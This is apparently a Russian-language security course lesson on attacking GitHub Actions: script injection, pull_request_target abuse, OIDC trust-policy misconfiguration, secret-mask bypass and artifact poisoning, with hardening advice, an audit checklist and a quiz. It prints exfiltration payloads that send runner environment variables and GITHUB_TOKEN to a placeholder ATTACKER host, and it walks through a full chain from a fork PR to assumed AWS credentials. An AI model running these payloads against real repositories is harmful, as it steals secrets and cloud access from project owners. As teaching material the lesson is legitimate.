---
id: cloud-cicd-github-actions
title: "GitHub Actions: инъекции в workflow и OIDC-доверие к облаку"
category: cloud
parent: cloud-cicd-secrets
difficulty: hard
order: 2
tags: [cloud, github-actions, workflow, injection, oidc, secrets, ci]
prerequisites: [cloud-cicd-secrets]
useful_for:
  - "Атака на GitHub Actions для получения облачных кредов"
  - "Понимание workflow injection"
  - "Bug bounty: CI/CD в публичных репозиториях"
estimated_minutes: 40
summary: "Как эксплуатировать GitHub Actions: script injection в workflow, pull_request_target, OIDC-доверие к AWS/GCP/Azure, утечка GITHUB_TOKEN и секретов. Практические пейлоады."
---
## Зачем этот урок

GitHub Actions — де-факто стандарт CI/CD: на этой платформе работают и публичные OSS-репозитории, и внутренние пайплайны корпораций. Уникальность угрозы в том, что workflow одновременно (1) исполняет код, который может контролировать внешний атакующий (код из pull request, текст issue, имя ветки) и (2) имеет доступ к секретам репозитория и — через OIDC — к облачным аккаунтам. Одна ошибка в триггере или в подстановке значения превращается в кражу `AWS_SECRET_ACCESS_KEY`. Здесь разбираем конкретные классы атак, пейлоады и сквозные цепочки: script injection, `pull_request_target`, OIDC-доверие, утечку `GITHUB_TOKEN`, отравление артефактов.

## Как устроен GitHub Actions: сущности и контексты

Workflow — это YAML-файл в `.github/workflows/`. Он состоит из:
- `on:` — триггеры (события): `push`, `pull_request`, `pull_request_target`, `issues`, `issue_comment`, `workflow_run`, `schedule`, `workflow_dispatch`, `release`.
- `jobs:` — задания, которые могут исполняться на разных раннерах параллельно.
- `steps:` — шаги; `uses:` тянет готовый action, `run:` исполняет shell-команду.

Контексты (`github.*`, `env.*`, `secrets.*`, `needs.*`) подставляются в YAML **до** запуска shell. Именно поэтому строка `run: echo "${{ github.event.issue.title }}"` — это не «экранированный вывод», а конкатенация текста issue прямо в тело команды. Разделяйте два уровня: `${{ }}` — подстановка на этапе компиляции workflow, `$VAR` — подстановка на этапе shell. Вся суть script injection в том, что недоверенные данные попадают в первый контекст.

## Где живут секреты и токены

- **`secrets.*`** — секреты репозитория, организации и environment. Доступны только «доверенным» событиям.
- **`GITHUB_TOKEN`** — автоматический токен раннера. Его права задаются блоком `permissions:`. Исторически был `write-all`; сейчас read-only по умолчанию, но многие репозитории явно выставляют `contents: write`, `packages: write`.
- **OIDC** — если у job стоит `permissions: id-token: write`, раннер может запросить OIDC-JWT и обменять его на креды AWS/Azure/GCP по trust policy. В окружении шага появляются `ACTIONS_ID_TOKEN_REQUEST_URL` и `ACTIONS_ID_TOKEN_REQUEST_TOKEN`.
- **`github.token`** — тот же `GITHUB_TOKEN` как контекст.

Ключевой вывод: `pull_request` из форка секретов **не** получает (защита платформы). А `pull_request_target`, `issue_comment`, `workflow_run` — получают, потому что считаются доверенными.

## Script injection: механика и полный разбор

Уязвимый workflow подставляет пользовательские данные в `run:`:

```yaml
- name: Greet
  run: echo "New issue: ${{ github.event.issue.title }}"
```

Пользователь создаёт issue с заголовком:

```
"; curl -s http://ATTACKER/$(cat /proc/self/environ | base64 -w0); echo "
```

Итоговая команда на раннере:

```bash
echo "New issue: "; curl -s http://ATTACKER/$(cat /proc/self/environ | base64 -w0); echo ""
```

`cat /proc/self/environ` отдаёт окружение шага, куда уже подставлены `secrets.*`. Часто проще забрать точечно: `curl http://ATTACKER/$GITHUB_TOKEN`.

Поля, которые контролирует атакующий: `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.comment.body`, `github.head_ref` (имя ветки в PR), `github.event.review.body`, `github.event.pages[].page_name`.

Безопасный вариант — промежуточная переменная:

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "New issue: $TITLE"
```

Здесь значение не попадает в текст команды, а передаётся через env — shell его не интерпретирует.

## pull_request_target: самый частый баг в OSS

`pull_request_target` запускается в контексте **базовой** ветки, то есть с секретами и с write-токеном. Опасность появляется, когда workflow делает checkout кода из PR:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

`npm ci` исполняет `postinstall` из `package.json` атакующего. Атакующий форкает репозиторий, добавляет:

```json
"scripts": { "postinstall": "curl -s http://ATTACKER/$(env | base64 -w0)" }
```

и открывает PR. Workflow запускается с секретами базовой ветки → эксфильтрация. Варианты без npm: подмена `Makefile`, `setup.py`, `conftest.py`, `.mocharc`, скриптов в `package.json`, а в некоторых конфигурациях — коммит в `.github/workflows/`.

## OIDC → облако: полная цепочка

Workflow с правом `id-token: write` получает JWT, чей claim `sub` описывает, кто его запросил, например `repo:org/repo:ref:refs/heads/main` или `repo:org/repo:pull_request`. Облако доверяет JWT по trust policy роли. Уязвимая policy:

```json
{ "Condition": { "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" } } }
```

Проверяется только `aud` — значит, **любой** репозиторий GitHub (и любой форк) получает роль. Ещё вариант — wildcard в `sub`: `repo:org/*` (любой репозиторий org) или `repo:org/repo:*` (любая ветка, включая PR из форка). Безопасно — точный `sub` с веткой или environment:

```json
"StringEquals": { "token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main" }
```

## Разобранный пример: PR в OSS → AWS-креды

1. Находим публичный репозиторий с `pull_request_target` (или `issue_comment`/`workflow_run`), который делает checkout PR-кода, а в другом job имеет `id-token: write`.
2. Форкаем, правим `package.json` (postinstall) или иной исполняемый файл.
3. Открываем PR. Workflow запускается с секретами.
4. На listener получаем env. Если OIDC не нужен — там уже `AWS_ACCESS_KEY_ID` и т.п. из `secrets.*`.
5. Для OIDC-пути запрашиваем токен:

```bash
TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
```

6. Обмениваем JWT на AWS-креды:

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/ci-role \
  --role-session-name gh \
  --web-identity-token "$TOKEN"
```

7. Работаем от имени роли: `aws sts get-caller-identity`, `aws s3 ls`, `aws iam list-roles`.

## Обход маскирования секретов

GitHub маскирует в логах точные значения `secrets.*`. Обходы: кодирование (`echo ${{ secrets.X }} | base64` — маска ищет исходную подстроку, base64 её не содержит), частичный посимвольный вывод, отправка наружу (лог не нужен), трансформации (hex, реверс).

## Artifact poisoning и supply chain

Если workflow собирает артефакт и затем публикует/деплоит его, атакующий с write-доступом к сборке может подменить артефакт (`actions/upload-artifact` → скачивание в другом job). Особенно опасны `workflow_run`, которые скачивают артефакт из PR-workflow: PR из форка подсовывает артефакт, который доверенный `workflow_run` потом исполняет с секретами.

## Детект и защита

- Не использовать `pull_request_target` с checkout PR-кода; если нужно — без секретов и прав.
- Никогда не подставлять `github.event.*`/`github.head_ref` напрямую в `run:` — только через `env:`.
- `permissions:` минимизировать; для чтения кода хватает `contents: read`.
- OIDC trust policy с точным `sub` (ветка/environment), никогда не `repo:*`.
- Пиновать сторонние actions по commit SHA, а не по тегу.
- Для деплой-джобов — `environment` с required reviewers.

## Частые ошибки

- **Не проверять `pull_request_target`.** Самый частый CI-баг в OSS.
- **Игнорировать `sub` в OIDC.** Широкая trust policy = захват роли из форка.
- **Считать секреты защищёнными от injection.** Маскирование обходится кодированием.
- **Не смотреть `permissions:`.** `write-all` открывает выпуск релизов и push в репозиторий.
- **Забыть про `issue_comment`/`workflow_run`.** Это тоже доверенные события с секретами.

## Что делать дальше / решение

Практика: возьмите публичный репозиторий, найдите workflow с `pull_request_target` (поиск по коду `github.event.pull_request.head`), проверьте, делает ли он checkout PR. Затем посмотрите trust policy ролей из `role-to-assume` в `configure-aws-credentials`. Свяжите с уроками `cloud-oidc-federation` и `cloud-assume-role`. Для защиты — внедрите `permissions: contents: read` и уберите checkout PR-кода в `pull_request_target`.

## Пинование actions и mutable-теги

Сторонние actions подключаются как `uses: owner/action@v4`. Тег — mutable-ссылка: владелец репозитория (или атакующий, захвативший его) может переприсвоить `v4` на вредоносный коммит, и все workflow, использующие `@v4`, немедленно исполнят чужой код с секретами. Безопасно — пин по полному commit SHA: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`. Для проверки найдите в репозитории все `uses:` без `@<40 hex>` — это потенциальный supply-chain вектор.

## environment, approvals и защита деплоя

`environment` в job даёт ручное подтверждение (required reviewers) и ограничивает секреты окружения. Атака: если PR-workflow может дотянуться до деплой-job через `workflow_run` и артефакт, он обходит approval, потому что `workflow_run` запускается автоматически. Защита — не передавать артефакты из недоверенных workflow в доверенные либо валидировать их содержимое перед исполнением.

## Чеклист аудита workflow

- Триггеры: есть ли `pull_request_target`/`issue_comment`/`workflow_run`?
- Подстановки: есть ли `${{ github.event.* }}` внутри `run:`?
- Permissions: не выставлен ли `write-all`?
- OIDC: точный ли `sub` в trust policy роли?
- Actions: пинованы по SHA?
- Секреты: не печатаются ли в лог напрямую?
- Артефакты: не переходят ли из недоверенного job в доверенный?

## Квиз

```quiz
- question: "Какое событие запускает workflow в контексте базовой ветки с доступом к секретам, но часто исполняет код PR?"
  options:
    - "push"
    - "pull_request_target"
    - "schedule"
    - "workflow_dispatch"
  answer: 1
  explanation: "pull_request_target имеет доступ к секретам, и checkout PR-кода делает его опасным."
- question: "Как получить облачные креды из GitHub Actions через OIDC?"
  options:
    - "Через SSH"
    - "Запросить OIDC-токен (id-token: write) и обменять его на облачные креды по trust policy"
    - "Через пароль"
    - "Через DNS"
  answer: 1
  explanation: "OIDC-токен обменивается на AWS/Azure/GCP-креды по настроенной trust policy."
- question: "Чем опасна trust policy с условием repo:org/*?"
  options:
    - "Ничем"
    - "Любой репозиторий организации получает доступ к роли"
    - "Она требует MFA"
    - "Она шифрует данные"
  answer: 1
  explanation: "Широкий wildcard в sub позволяет любому репозиторию org получить роль."
- question: "Как избежать script injection в workflow?"
  options:
    - "Использовать больше секретов"
    - "Не подставлять github.event.* напрямую в run, а передавать через env"
    - "Отключить OIDC"
    - "Использовать только push"
  answer: 1
  explanation: "Передача через промежуточную переменную окружения предотвращает подстановку в shell."
- question: "Почему actions стоит пиновать по SHA?"
  options:
    - "Так быстрее"
    - "Тег можно переприсвоить на вредоносный коммит"
    - "SHA короче"
    - "Иначе не соберётся"
  answer: 1
  explanation: "Пин по SHA фиксирует точный код; тег может быть переприсвоен."
```

## Где пригодится

- **Bug bounty** — CI/CD в публичных репозиториях.
- **Пентест** — атака на supply chain через CI.
- **Red team** — от PR к облачным кредам.
- **IR/Blue team** — детект подозрительных workflow-запусков.
- **DevSecOps** — hardening GitHub Actions.
